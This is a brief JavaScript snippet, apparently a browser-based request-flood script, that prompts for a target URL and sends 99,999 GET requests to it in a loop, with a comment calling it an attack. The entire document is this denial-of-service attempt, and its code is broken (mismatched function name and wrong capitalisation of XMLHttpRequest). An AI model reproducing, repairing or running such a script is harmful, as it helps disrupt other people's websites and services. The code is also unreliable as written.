
var target_Url = window.prompt("targeted url");

//Attack using XMLHttpRequest
function sendXHr(){
    var xhr = new XMLHTTPREQUEST();
    xhr.open("GET",target_Url, true);
    xhr.send();
}
var count = 0;
for(;count < 99999;){
    sendxhr();
    count++;
}